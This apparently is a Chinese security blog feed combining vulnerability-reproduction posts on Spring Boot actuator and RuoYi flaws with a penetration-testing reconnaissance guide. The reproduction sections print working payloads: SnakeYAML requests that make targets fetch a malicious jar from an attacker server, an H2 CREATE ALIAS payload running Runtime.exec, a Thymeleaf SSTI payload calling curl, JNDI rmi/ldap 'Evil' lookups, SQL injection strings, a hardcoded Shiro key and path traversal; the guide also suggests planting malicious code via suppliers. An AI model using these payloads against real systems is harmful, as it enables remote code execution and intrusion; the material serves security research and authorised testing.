.\JDumpSpider-1.1-SNAPSHOT-full.jar .\heapdump</span><br></pre></td></tr></table></figure><p><img src="/../images/image-20230622152614844.png" alt="image-20230622152614844"></p><p><img src="/../images/image-20230622152600035.png" alt="image-20230622152600035"></p></li></ul><h2 id="Spring-cloud-SnakeYAML-RCE"><a href="#Spring-cloud-SnakeYAML-RCE" class="headerlink" title="Spring cloud SnakeYAML RCE"></a>Spring cloud SnakeYAML RCE</h2><h3 id="版本影响"><a href="#版本影响" class="headerlink" title="版本影响"></a>版本影响</h3><p>目标依赖的 <code>spring-cloud-starter</code> 版本 &lt; 1.3.0</p><h3 id="复现-1"><a href="#复现-1" class="headerlink" title="复现"></a>复现</h3><p>本地生成yaml-payload的jar包,命令为</p><p><img src="/../images/image-20230623221559474.png" alt="image-20230623221559474"></p><p>生成利用该jar包的example.yml文件</p><p><img src="/../images/image-20230623221123809.png" alt="image-20230623221123809"></p><p>挂载服务</p><p><img src="/../images/image-20230623221249623.png" alt="image-20230623221249623"></p><p>设置spring.cloud.bootstrap.location 属性为外部恶意 yml 文件 URL 地址</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="comment"># spring 1.x</span></span><br><span class="line">POST /env</span><br><span class="line">Content-Type: application/x-www-form-urlencoded</span><br><span class="line"></span><br><span class="line">eureka.client.serviceUrl.defaultZone=http:<span class="comment">//your-vps-ip/example.yml</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># spring 2.x</span></span><br><span class="line">POST /actuator/env</span><br><span class="line">Content-Type: application/json</span><br><span class="line"></span><br><span class="line">&#123;<span class="string">&quot;name&quot;</span>:<span class="string">&quot;eureka.client.serviceUrl.defaultZone&quot;</span>,<span class="string">&quot;value&quot;</span>:<span class="string">&quot;http://your-vps-ip/example.yml&quot;</span>&#125;</span><br></pre></td></tr></table></figure><p><img src="/../images/image-20230623220715323.png" alt="image-20230623220715323"></p><p>refresh 触发目标机器请求远程 HTTP 服务器上的 yml 文件，获得其内容</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="comment"># spring 1.x</span></span><br><span class="line"></span><br><span class="line">POST /refresh</span><br><span class="line">Content-Type: application/x-www-form-urlencoded</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># spring 2.x</span></span><br><span class="line"></span><br><span class="line">POST /actuator/refresh</span><br><span class="line">Content-Type: application/json</span><br></pre></td></tr></table></figure><p><img src="/../images/image-20230623220901991.png" alt="image-20230623220901991"></p><p>SnakeYAML 由于存在反序列化漏洞，所以解析恶意 yml 内容时会完成指定的动作,先是触发 java.net.URL 去拉取远程 HTTP 服务器上的恶意 jar 文件,然后是寻找 jar 文件中实现 javax.script.ScriptEngineFactory 接口的类并实例化,实例化类时执行恶意代码，造成 RCE 漏洞</p><p><img src="/../images/image-20230623220853189.png" alt="image-20230623220853189"></p><h3 id="注入内存马"><a href="#注入内存马" class="headerlink" title="注入内存马"></a>注入内存马</h3><p><img src="/../images/image-20230623222557267.png" alt="image-20230623222557267"></p><h2 id="Spring-restart-h2-database-query-RCE"><a href="#Spring-restart-h2-database-query-RCE" class="headerlink" title="Spring restart h2 database query RCE"></a>Spring restart h2 database query RCE</h2><h3 id="版本影响-1"><a href="#版本影响-1" class="headerlink" title="版本影响"></a>版本影响</h3><p>存在 <code>com.h2database.h2</code> 依赖（版本要求暂未知）</p><h3 id="复现-2"><a href="#复现-2" class="headerlink" title="复现"></a>复现</h3><p>hackbar需要将原本的content-type删除，然后选择application&#x2F;json才可以发送Content-Type: application&#x2F;json的请求</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line">POST /actuator/env</span><br><span class="line">Content-Type: application/json</span><br><span class="line"></span><br><span class="line">&#123;<span class="string">&quot;name&quot;</span>:<span class="string">&quot;spring.datasource.hikari.connection-test-query&quot;</span>,<span class="string">&quot;value&quot;</span>:<span class="string">&quot;CREATE ALIAS T5 AS CONCAT(&#x27;void ex(String m1,String m2,String m3)throws Exception&#123;Runti&#x27;,&#x27;me.getRun&#x27;,&#x27;time().exe&#x27;,&#x27;c(new String[]&#123;m1,m2,m3&#125;);&#125;&#x27;);CALL T5(&#x27;cmd&#x27;,&#x27;/c&#x27;,&#x27;calc&#x27;);&quot;</span>&#125;</span><br></pre></td></tr></table></figure><p><img src="/../images/image-20230623233147055.png" alt="image-20230623233147055"></p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line">POST /actuator/restart</span><br><span class="line">Content-Type: application/json</span><br></pre></td></tr></table></figure><p><img src="/../images/image-20230623233543854.png" alt="image-20230623233543854"></p><p><img src="/../images/image-20230623233529452.png" alt="image-20230623233529452"></p><p>需要注意的是payload 中的 ‘T5’ 方法每一次执行命令后都需要更换名称 (如 T6) ，然后才能被重新创建使用，否则下次 restart 重启应用时漏洞不会被触发</p><p><img src="/../images/image-20230623233701077.png" alt="image-20230623233701077"></p><h2 id="Spring-Cloud-Gateway-SPEL-RCE"><a href="#Spring-Cloud-Gateway-SPEL-RCE" class="headerlink" title="Spring Cloud Gateway SPEL RCE"></a>Spring Cloud Gateway SPEL RCE</h2><p>Spring Cloud Gateway是Spring中的一个API网关。存在SpEL表达式注入漏洞，<strong>当攻击者可以访问Actuator API的情况下</strong>，将可以利用该漏洞执行任意命令。</p><h3 id="版本影响-2"><a href="#版本影响-2" class="headerlink" title="版本影响"></a>版本影响</h3><ul><li>Spring Cloud Gateway<ul><li>3.1.0</li><li>3.0.0 to 3.0.6</li><li>Older, unsupported versions are also affected</li></ul></li></ul><h3 id="复现-3"><a href="#复现-3" class="headerlink" title="复现"></a>复现</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">添加一个包含恶意SpEL表达式的路由/actuator/gateway/routes/hacktest</span><br><span class="line">应用刚添加的路由/actuator/gateway/refresh</span><br><span class="line">访问恶意路由得到结果/actuator/gateway/routes/hacktest</span><br></pre></td></tr></table></figure><p><img src="/../images/image-20230622121048903.png" alt="image-20230622121048903"></p><p><img src="/../images/image-20230622121110774.png" alt="image-20230622121110774"></p><h2 id="Cloud-Function-SPEL-RCE"><a href="#Cloud-Function-SPEL-RCE" class="headerlink" title="Cloud Function  SPEL RCE"></a>Cloud Function  SPEL RCE</h2><p>Spring Cloud Function 是Spring cloud中的serverless框架。</p><p>Spring Cloud Function 中的 RoutingFunction 类的 apply 方法将请求头中的“spring.cloud.function.routing-expression”参数作为 Spel 表达式进行处理，造成 Spel 表达式注入漏洞。</p><p>攻击者可通过该漏洞执行任意代码。</p><h3 id="版本影响-3"><a href="#版本影响-3" class="headerlink" title="版本影响"></a>版本影响</h3><p>org.springframework.cloud:spring-cloud-function-context（影响版本：3.0.0.RELEASE~3.2.2）</p><h3 id="复现-4"><a href="#复现-4" class="headerlink" title="复现"></a>复现</h3><p>accept需要修改</p><p><img src="/../images/image-20230622130314936.png"></p><p><img src="/../images/image-20230622130328296.png" alt="image-20230622130328296"></p><h2 id="spring-core-rce"><a href="#spring-core-rce" class="headerlink" title="spring-core-rce"></a>spring-core-rce</h2><h3 id="版本影响-4"><a href="#版本影响-4" class="headerlink" title="版本影响"></a>版本影响</h3><p>使用JDK9及以上版本的Spring MVC框架<br>spring-webmvc 或 spring-webflux依赖<br>spring framework 5.3.0-5.3.17、5.2.0-5.2.19版本，以及更早的版本</p><h3 id="复现-5"><a href="#复现-5" class="headerlink" title="复现"></a>复现</h3><p>这里环境用vulfocus的，vulhub的不知道为啥不行</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">docker pull vulfocus/spring-core-rce-2022-03-29</span><br><span class="line">docker run -d -p 8090:8080 --name springrce -it vulfocus/spring-core-rce-2022-03-29</span><br></pre></td></tr></table></figure><p>攻击原理</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">通过修改Tomcat的日志路径与后缀写入jsp木马</span><br></pre></td></tr></table></figure><p>脚本：<a href="https://github.com/Axx8/SpringFramework_CVE-2022-22965_RCE">https://github.com/Axx8/SpringFramework_CVE-2022-22965_RCE</a></p><p><img src="/../images/image-20230622144319219.png" alt="image-20230622144319219"></p><p><img src="/../images/image-20230622144248672.png" alt="image-20230622144248672"></p><p><img src="/../images/image-20230622143115129.png" alt="image-20230622143115129"></p><p>需要注意的是每次向webhsell请求时都会再次向其写入木马内容</p><p><img src="/../images/image-20230622143518694.png" alt="image-20230622143518694"></p><p>可以通过以下请求进行清除</p><figure class="highlight http"><table><tr><td class="code"><pre><span class="line">/?class.module.classLoader.resources.context.parent.pipeline.first.pattern=</span><br></pre></td></tr></table></figure><p>总体来说，这个漏洞的利用方法会修改目标服务器配置，导致目标需要重启服务器才能恢复，实际测试中需要格外注意。</p><h2 id="权限绕过"><a href="#权限绕过" class="headerlink" title="权限绕过"></a>权限绕过</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">/admin/%0a</span><br><span class="line">/admin/%0d</span><br><span class="line"></span><br><span class="line"># CVE-2023-20860</span><br><span class="line">/admin/** </span><br></pre></td></tr></table></figure><h3 id="复现-6"><a href="#复现-6" class="headerlink" title="复现"></a>复现</h3><p><img src="/../images/image-20230622145009253.png" alt="image-20230622145009253"></p><p><img src="/../images/image-20230622145034999.png" alt="image-20230622145034999"></p><h2 id="推荐阅读"><a href="#推荐阅读" class="headerlink" title="推荐阅读"></a>推荐阅读</h2><p><a href="https://github.com/LandGrey/SpringBootVulExploit#%E4%B8%80%E4%BF%A1%E6%81%AF%E6%B3%84%E9%9C%B2">LandGrey&#x2F;SpringBootVulExploit: SpringBoot 相关漏洞学习资料，利用方法和技巧合集，黑盒安全评估 check list</a></p><p><a href="https://xz.aliyun.com/t/9763">https://xz.aliyun.com/t/9763</a></p>]]></content>
      
      
      <categories>
          
          <category> 漏洞复现 </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>若依漏洞</title>
      <link href="/2023/06/21/%E8%8B%A5%E4%BE%9D%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/"/>
      <url>/2023/06/21/%E8%8B%A5%E4%BE%9D%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/</url>
      
        <content type="html"><![CDATA[<h2 id="介绍"><a href="#介绍" class="headerlink" title="介绍"></a>介绍</h2><h2 id="相关介绍"><a href="#相关介绍" class="headerlink" title="相关介绍"></a>相关介绍</h2><p><a href="http://ruoyi.vip/">http://ruoyi.vip/</a></p><p>基于<strong>SpringBoot</strong>的权限管理系统 易读易懂、界面简洁美观。 核心技术采用<strong>Spring、MyBatis、Shiro</strong>没有任何其它重度依赖。</p><blockquote><p>若依的作者将Spring Security替换为shiro</p></blockquote><h2 id="漏洞概览"><a href="#漏洞概览" class="headerlink" title="漏洞概览"></a>漏洞概览</h2><p>官方对历史漏洞进行了相关整理：<a href="https://doc.ruoyi.vip/ruoyi/document/kslj.html#%E5%8E%86%E5%8F%B2%E6%BC%8F%E6%B4%9E">https://doc.ruoyi.vip/ruoyi/document/kslj.html#%E5%8E%86%E5%8F%B2%E6%BC%8F%E6%B4%9E</a></p><table><thead><tr><th>漏洞名称</th><th>访问路径</th><th>版本</th></tr></thead><tbody><tr><td>Thymeleaf SSTI</td><td><code>/monitor/cache/getNames</code></td><td>&lt;&#x3D; v4.7.1</td></tr><tr><td>定时计划反射RCE</td><td><code>系统监控—&gt;定时任务—&gt;添加任务-&gt;调用目标字符串</code></td><td>&lt;&#x3D; v4.6.2</td></tr><tr><td>SQL注入</td><td><code>/system/role/list</code>、<code>/system/dept/edit</code></td><td>&lt;&#x3D; 4.6.1</td></tr><tr><td>任意文件下载</td><td><code>/common/download/resource</code></td><td>&lt;&#x3D; v4.5.0</td></tr><tr><td>Fastjson RCE</td><td><code>/tool/gen/edit</code></td><td>&lt;&#x3D; v4.2.0</td></tr></tbody></table><p>默认口令：admin&#x2F;admin123</p><h2 id="环境搭建"><a href="#环境搭建" class="headerlink" title="环境搭建"></a>环境搭建</h2><ul><li><p>hunter</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">web.body=&quot;/ruoyi/css/ry-ui.css?v=版本号&quot;</span><br></pre></td></tr></table></figure></li><li><p>本地搭建</p><p>下载：<a href="https://gitee.com/y_project/RuoYi">https://gitee.com/y_project/RuoYi</a></p><p>IDEA连接数据库</p><p><img src="/../images/image-20230621190329600.png" alt="image-20230621190329600"></p><p>剩下步骤</p><p>修改配置文件<code>RuoYi-Vue/ruoyi-admin/src/main/resources/logback.xml</code>中的数据库账号和密码</p><p><a href="https://juejin.cn/post/7081625556705345573">RuoYi搭建开发环境 - 掘金</a></p></li></ul><h2 id="Thymeleaf-SSTI"><a href="#Thymeleaf-SSTI" class="headerlink" title="Thymeleaf SSTI"></a>Thymeleaf SSTI</h2><h3 id="复现"><a href="#复现" class="headerlink" title="复现"></a>复现</h3><figure class="highlight http"><table><tr><td class="code"><pre><span class="line"><span class="keyword">POST</span> <span class="string">/monitor/cache/getNames</span> <span class="meta">HTTP/1.1</span></span><br><span class="line"></span><br><span class="line"><span class="language-apache"><span class="attribute">fragment</span>=__<span class="variable">$&#123;T<span class="number">%20</span>(java.lang.Runtime).getRuntime().exec(&#x27;curl<span class="number">%20</span>cn0165.dnslog.cn&#x27;)&#125;</span>__::.x</span></span><br></pre></td></tr></table></figure><p><img src="/../images/image-20230825151844044.png" alt="image-20230825151844044"></p><p><img src="/../images/image-20230825151819003.png" alt="image-20230825151819003"></p><h3 id="绕过姿势"><a href="#绕过姿势" class="headerlink" title="绕过姿势"></a>绕过姿势</h3><p><a href="https://xz.aliyun.com/t/11509#toc-3">记一次实战之若依SSTI注入绕过玄某盾 - 先知社区</a></p><h2 id="后台定时任务"><a href="#后台定时任务" class="headerlink" title="后台定时任务"></a>后台定时任务</h2><h3 id="复现-1"><a href="#复现-1" class="headerlink" title="复现"></a>复现</h3><p>默认密码为admin&#x2F;admin123</p><p>进入后台系统监控下的定时任务功能，可以发现调用目标字符串的字段。</p><p><img src="/../images/image-20230621192434476.png" alt="image-20230621192434476"></p><p>这里存在yaml反序列化漏洞，分析<a href="https://www.cnblogs.com/nice0e3/p/14514882.html">https://www.cnblogs.com/nice0e3/p/14514882.html</a></p><h4 id="生成yaml恶意jar包"><a href="#生成yaml恶意jar包" class="headerlink" title="生成yaml恶意jar包"></a>生成yaml恶意jar包</h4><p><a href="https://github.com/artsploit/yaml-payload">https://github.com/artsploit/yaml-payload</a></p><p>修改项目源码文件 src&#x2F;artsploit&#x2F;AwesomeScriptEngineFactory.java </p><p><img src="/../images/image-20230621210916844.png" alt="image-20230621210916844"></p><p>在idea中打开终端</p><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_"># </span><span class="language-bash">打包为jar包</span></span><br><span class="line">javac src/artsploit/AwesomeScriptEngineFactory.java</span><br><span class="line">jar -cvf yaml-payload.jar -C src/ .</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">开启http服务</span></span><br><span class="line">python -m http.server 1234</span><br></pre></td></tr></table></figure><h4 id="创建并开启定时任务"><a href="#创建并开启定时任务" class="headerlink" title="创建并开启定时任务"></a>创建并开启定时任务</h4><p><img src="/../images/image-20230825143833628.png" alt="image-20230825143833628"></p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line">org.yaml.snakeyaml.Yaml.load(<span class="string">&#x27;!!javax.script.ScriptEngineManager [!!java.net.URLClassLoader [[!!java.net.URL [&quot;http://ip:port/yaml-payload.jar&quot;]]]]&#x27;</span>)</span><br><span class="line"></span><br><span class="line">org.springframework.jndi.JndiLocatorDelegate.lookup(<span class="string">&#x27;rmi://ip:port/Evil&#x27;</span>)</span><br><span class="line"></span><br><span class="line">javax.naming.InitialContext.lookup(<span class="string">&#x27;ldap://ip:port/#Evil&#x27;</span>)</span><br></pre></td></tr></table></figure><h4 id="结果"><a href="#结果" class="headerlink" title="结果"></a>结果</h4><p><img src="/../images/image-20230621210823778.png" alt="image-20230621210823778"></p><p><img src="/../images/image-20230621210844522.png" alt="image-20230621210844522"></p><h3 id="绕过姿势-1"><a href="#绕过姿势-1" class="headerlink" title="绕过姿势"></a>绕过姿势</h3><p><a href="https://xz.aliyun.com/t/10957#toc-0">某依rce黑名单多种bypass方法分析 - 先知社区</a></p><p><a href="https://xz.aliyun.com/t/11336#toc-0">定时任务功能点绕过黑白名单执行任意sql语句 - 先知社区</a></p><h2 id="后台Sql注入"><a href="#后台Sql注入" class="headerlink" title="后台Sql注入"></a>后台Sql注入</h2><h3 id="复现-2"><a href="#复现-2" class="headerlink" title="复现"></a>复现</h3><p>分析<a href="https://tttang.com/archive/1712/#toc_0x2-ruoyi-461-sql">https://tttang.com/archive/1712/#toc_0x2-ruoyi-461-sql</a></p><figure class="highlight http"><table><tr><td class="code"><pre><span class="line"><span class="keyword">POST</span> <span class="string">/system/role/list</span> <span class="meta">HTTP/1.1</span></span><br><span class="line"></span><br><span class="line"><span class="language-stylus">params<span class="selector-attr">[dataScope]</span>=and <span class="built_in">extractvalue</span>(<span class="number">1</span>,<span class="built_in">concat</span>(<span class="number">0</span>x7e,(select <span class="built_in">user</span>()),<span class="number">0</span>x7e))</span></span><br></pre></td></tr></table></figure><p><img src="/../images/image-20230621195248659.png" alt="image-20230621195248659"></p><figure class="highlight http"><table><tr><td class="code"><pre><span class="line"><span class="keyword">POST</span> <span class="string">/system/dept/edit</span> <span class="meta">HTTP/1.1</span></span><br><span class="line"></span><br><span class="line"><span class="language-apache"><span class="attribute">DeptName</span>=<span class="number">1</span>&amp;DeptId=<span class="number">100</span>&amp;ParentId=<span class="number">12</span>&amp;Status=<span class="number">0</span>&amp;OrderNum=<span class="number">1</span>&amp;ancestors=<span class="number">0</span>)or(extractvalue(<span class="number">1</span>,concat((select user()))));#</span></span><br></pre></td></tr></table></figure><h2 id="shiro反序列化"><a href="#shiro反序列化" class="headerlink" title="shiro反序列化"></a>shiro反序列化</h2><p>前面提到了若依的核心技术采用<strong>Shiro</strong>，如果密钥泄露了，自然就存在shiro反序列化漏洞。</p><p>默认是动态生成密钥，固定密钥可以在<code>application.yml</code>中配置<code>shiro.cookie.cipherKey</code></p><p><img src="/../images/image-20230621193653154.png" alt="image-20230621193653154"></p><p>V4.3.1~V4.6.1，cipherKey使用硬编码zSyK5Kp6PZAAjlT+eeNMlg&#x3D;&#x3D;</p><p><img src="/../images/image-20230621203731261.png" alt="image-20230621203731261"></p><h3 id="复现-3"><a href="#复现-3" class="headerlink" title="复现"></a>复现</h3><p><img src="/../images/image-20230621202753098.png" alt="image-20230621202753098"></p><h2 id="后台任意文件下载"><a href="#后台任意文件下载" class="headerlink" title="后台任意文件下载"></a>后台任意文件下载</h2><figure class="highlight http"><table><tr><td class="code"><pre><span class="line">/common/download/resource?resource=/profile/../pom.xml</span><br></pre></td></tr></table></figure><p><img src="/../images/image-20230825145931666.png" alt="image-20230825145931666"></p>]]></content>
      
      
      <categories>
          
          <category> 漏洞复现 </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>渗透测试流程</title>
      <link href="/2023/06/21/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E6%B5%81%E7%A8%8B/"/>
      <url>/2023/06/21/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E6%B5%81%E7%A8%8B/</url>
      
        <content type="html"><![CDATA[<h1 id="总体流程"><a href="#总体流程" class="headerlink" title="总体流程"></a>总体流程</h1><p><img src="/../images/1550719703_5c6e1ad700bb6-1685533751883.png!small" alt="图片.png"></p><p>​<a href="https://www.freebuf.com/column/196291.html">渗透测试的8个步骤 - FreeBuf网络安全行业门户</a></p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">明确目标：与客户交流，得到渗透的范围，规则和需求</span><br><span class="line">信息收集：资产收集+敏感信息收集+指纹识别</span><br><span class="line">漏洞探测和信息分析：漏洞探测与利用</span><br><span class="line">获取所需：后渗透</span><br><span class="line">信息整理和形成报告：产出报告</span><br></pre></td></tr></table></figure><h1 id="外网简化流程"><a href="#外网简化流程" class="headerlink" title="外网简化流程"></a>外网简化流程</h1><ul><li><p>公司到域名：enscan，icp-domains</p></li><li><p>子域名收集：oneforall（子域名爆破耗时，某些情况下可以选择不使用）+ 零零信安 </p><blockquote><p>域名可以再用altdns跑一下</p></blockquote></li><li><p>洗IP</p><ul><li><p>CDN识别：FCDN</p></li><li><p>域名→IP→C段：CIPR </p></li><li><p>端口扫描：Goby</p></li></ul></li><li><p>URL验活：httpx</p></li><li><p>指纹识别：Ehole，chunsou</p></li><li><p>漏洞扫描：AWVS，Xray，Afrog，nuclei</p></li><li><p>目录扫描：dirsearch，Arl</p></li><li><p>敏感信息收集</p></li><li><p>测试</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">nday</span><br><span class="line">弱口令</span><br><span class="line">接口测试</span><br><span class="line">逻辑漏洞</span><br><span class="line">代码审计</span><br></pre></td></tr></table></figure></li></ul><h1 id="资产收集"><a href="#资产收集" class="headerlink" title="资产收集"></a>资产收集</h1><h2 id="为什么"><a href="#为什么" class="headerlink" title="为什么"></a>为什么</h2><p><strong>尽可能的扩大攻击面</strong></p><h2 id="主域名收集"><a href="#主域名收集" class="headerlink" title="主域名收集"></a>主域名收集</h2><h3 id="ICP备案查询"><a href="#ICP备案查询" class="headerlink" title="ICP备案查询"></a>ICP备案查询</h3><ul><li><p>是什么</p><p>ICP备案是指网站在信息产业部提交网站信息进行官方认可。</p><p>所以国内使用国内服务器的网站，都必须要先办理ICP备案后才可以上线。</p></li><li><p>有什么用</p><p>通过查询目标企业的备案信息，可直接获取到目标企业注册了哪些域名，从而增加可渗透的目标范围。</p></li><li><p>在线查询</p><p><a href="https://beian.miit.gov.cn/#/Integrated/recordQuery">ICP&#x2F;IP地址&#x2F;域名信息备案管理系统</a></p><p><a href="https://www.gsxt.gov.cn/index.html">国家企业信用信息公示系统</a></p><p><a href="https://www.qcc.com/">企查查 </a></p><p><a href="https://www.tianyancha.com/">天眼查</a></p></li><li><p>工具</p><p><a href="https://github.com/1in9e/icp-domains">1in9e&#x2F;icp-domains: 输入一个域名，输出ICP备案所有关联域名</a></p></li></ul><h3 id="WhoIs"><a href="#WhoIs" class="headerlink" title="WhoIs"></a>WhoIs</h3><ul><li><p>是什么</p><p><code>WHOIS</code>是用来查询互联网中域名的IP以及所有者等信息的传输协议。</p></li><li><p>有什么用</p><p>通过查询目标的WHOIS信息，可以对联系人、联系邮箱等信息进行反查，可以获取更多相关的域名信息。</p></li><li><p>在线查询</p><p><a href="https://whois.chinaz.com/">域名Whois查询 - 站长之家</a></p><p><a href="http://whois.bugscaner.com/">在线域名Whois查询,网站Whois反查-在线站长工具 bugscaner</a></p><p><a href="https://who.is/">WHOIS Search, Domain Name, Website, and IP Tools - Who.is</a></p></li></ul><h3 id="股权信息"><a href="#股权信息" class="headerlink" title="股权信息"></a>股权信息</h3><ul><li><p>是什么，有什么用</p><p>通过查询股权信息，或者股权穿透图，寻找子公司和孙公司等，一般对外投资超过50%或者有行政权限的都可以算目标</p></li><li><p>查询网站</p><p><a href="https://www.qcc.com/">企查查 </a></p><p><a href="https://www.tianyancha.com/">天眼查</a></p></li></ul><h3 id="其他应用中的域名-x2F-IP"><a href="#其他应用中的域名-x2F-IP" class="headerlink" title="其他应用中的域名&#x2F;IP"></a>其他应用中的域名&#x2F;IP</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">微信/支付宝小程序</span><br><span class="line">微信公众号</span><br><span class="line">手机APP：抓包，历史版本</span><br></pre></td></tr></table></figure><h3 id="DNS共享记录查询"><a href="#DNS共享记录查询" class="headerlink" title="DNS共享记录查询"></a>DNS共享记录查询</h3><ul><li><p>原理</p><p>查询共享DNS服务器的主机来获取到相关的域名</p></li><li><p>步骤</p><ol><li><p>首先查询目标是否存在自建的NS服务器</p><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">nslookup -query=ns baidu.com</span><br></pre></td></tr></table></figure></li><li><p>将非权威应答中的ns服务器带到下面的网站查询</p><p><a href="https://hackertarget.com/find-shared-dns-servers/">Find all Hosts pointing to DNS Server</a></p></li></ol></li></ul><h3 id="供应链公司"><a href="#供应链公司" class="headerlink" title="供应链公司"></a>供应链公司</h3><p><a href="https://xz.aliyun.com/t/10531">记一次通过供应链拿到目标后台权限的过程 - 先知社区</a></p><p><a href="https://mp.weixin.qq.com/s/IgmxbD-1y08w5gd7gVOmSg">https://mp.weixin.qq.com/s/IgmxbD-1y08w5gd7gVOmSg</a></p><ul><li><p>为什么</p><p>试想一下，目标使用供应商提供的软件，那么这些软件是受到信任的。</p><p>所以我们可以通过攻击供应商，并在软件中植入恶意代码，这样目标在运行软件时也会运行恶意代码，从而达到攻击。</p><p>并且供应商保存了目标的各种信息。</p></li><li><p>手段</p><ul><li>网站页底的备案，版权信息<img src="/../images/image-20230511130314346-1685533751887.png" alt="image-20230511130314346"></li><li>招标文件</li></ul></li></ul><h3 id="聚合工具"><a href="#聚合工具" class="headerlink" title="聚合工具"></a>聚合工具</h3><p><a href="https://github.com/wgpsec/ENScan_GO">https://github.com/wgpsec/ENScan_GO</a></p><blockquote><p>一款基于各大企业信息API的工具，解决在遇到的各种针对国内企业信息收集难题。一键收集控股公司ICP备案、APP、小程序、微信公众号等信息聚合导出。</p></blockquote><p><img src="/../images/ENScanGo-1685533751887.png" alt="ENScanGo"></p><h2 id="子域名收集"><a href="#子域名收集" class="headerlink" title="子域名收集"></a>子域名收集</h2><h3 id="枚举爆破"><a href="#枚举爆破" class="headerlink" title="枚举爆破"></a>枚举爆破</h3><ul><li><p>原理</p><p>通过不断的拼接字典中的子域名前缀去枚举域名的A记录，再对其进行验证，但是该方法一般需要解决泛解析问题。</p></li><li><p>在线网站</p><p><a href="http://z.zcjun.com/">在线子域名爆破-子成君提供</a></p></li></ul><h3 id="证书透明度"><a href="#证书透明度" class="headerlink" title="证书透明度"></a>证书透明度</h3><ul><li><p>是什么</p><p>证书透明性（Certificate Transparency，CT）是 Google 的公开项目，通过让域所有者、CA 和域用户对 SSL 证书的发行和存在进行审查，来纠正这些基于证书的威胁。</p></li><li><p>有什么用</p><p>因为是公开的，所以任何人都可以访问到其中的CA 证书，包含了域名、子域名、邮箱等敏感信息。</p></li><li><p>在线查询</p><p><a href="https://crt.sh/">crt.sh | Certificate Search</a></p><p><a href="https://search.censys.io/">Censys Search</a></p></li></ul><h3 id="DNS公开数据集"><a href="#DNS公开数据集" class="headerlink" title="DNS公开数据集"></a>DNS公开数据集</h3><p>利用已有公开的扫描数据集，对子域名信息进行收集。</p><p><a href="https://opendata.rapid7.com/">https://opendata.rapid7.com/</a></p><h3 id="DNS-域传送"><a href="#DNS-域传送" class="headerlink" title="DNS 域传送"></a>DNS 域传送</h3><ul><li><p>是什么</p><p>DNS服务器分为主服务器，备份服务器，缓存服务器。</p><p><strong>域传送</strong>是指备份服务器从主服务器上复制数据，然后更新自身的数据库，以达到数据同步的目的，这样是为了增加冗余，一旦主服务器出现问题可直接让备份服务器做好支撑工作。</p></li><li><p>有什么用</p><p>若 DNS 服务器配置不当，可能导致攻击者获取某个域的所有记录。造成整个网络的拓扑结构泄露给潜在的攻击者。</p></li><li><p>检测方法</p><ul><li><p>dig请求</p><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_"># </span><span class="language-bash">找到NS服务器</span></span><br><span class="line">dig [domain] ns</span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">发送axfr请求</span></span><br><span class="line">dig axfr @[ns] [domain]</span><br></pre></td></tr></table></figure></li><li><p>nmap脚本</p><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">--script dns-zone-transfer --script-args dns-zone-transfer.domain=[domain]</span><br></pre></td></tr></table></figure></li></ul></li></ul><h3 id="搜索引擎"><a href="#搜索引擎" class="headerlink" title="搜索引擎"></a>搜索引擎</h3><ul><li><p>传统搜索引擎</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">site: xxx.com -xxx (-xxx 排除哪些子域)</span><br></pre></td></tr></table></figure></li><li><p>网络空间测绘</p></li></ul><h3 id="第三方在线平台"><a href="#第三方在线平台" class="headerlink" title="第三方在线平台"></a>第三方在线平台</h3><ul><li><p><a href="https://securitytrails.com(ui好看,结果最多)/">https://securitytrails.com（UI好看，结果最多）</a></p></li><li><p><a href="https://dnsdumpster.com/">DNSdumpster.com </a></p></li><li><p><a href="https://rapiddns.io/">https://rapiddns.io/</a></p></li></ul><h3 id="聚合工具-1"><a href="#聚合工具-1" class="headerlink" title="聚合工具"></a>聚合工具</h3><h4 id="收集工具"><a href="#收集工具" class="headerlink" title="收集工具"></a>收集工具</h4><ul><li><p><code>OneForAll</code></p><blockquote><p>一条龙，需要配置api，配合代理使用效果更佳</p></blockquote><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">python oneforall.py --target domain run</span><br><span class="line">python oneforall.py --targets domain.txt run</span><br></pre></td></tr></table></figure></li></ul><h4 id="探活工具"><a href="#探活工具" class="headerlink" title="探活工具"></a>探活工具</h4><ul><li><code>httpx</code></li></ul><h2 id="IP段信息收集"><a href="#IP段信息收集" class="headerlink" title="IP段信息收集"></a>IP段信息收集</h2><h3 id="CDN"><a href="#CDN" class="headerlink" title="CDN"></a>CDN</h3><p>From[BYPASS-CDN&#x2F;CDN 2023 完全攻击指南（一）.md at main · bin-maker&#x2F;BYPASS-CDN · GitHub](<a href="https://github.com/bin-maker/BYPASS-CDN/blob/main/CDN">https://github.com/bin-maker/BYPASS-CDN/blob/main/CDN</a> 2023 完全攻击指南（一）.md)</p><h4 id="是什么"><a href="#是什么" class="headerlink" title="是什么"></a>是什么</h4><p>CDN（Content Delivery 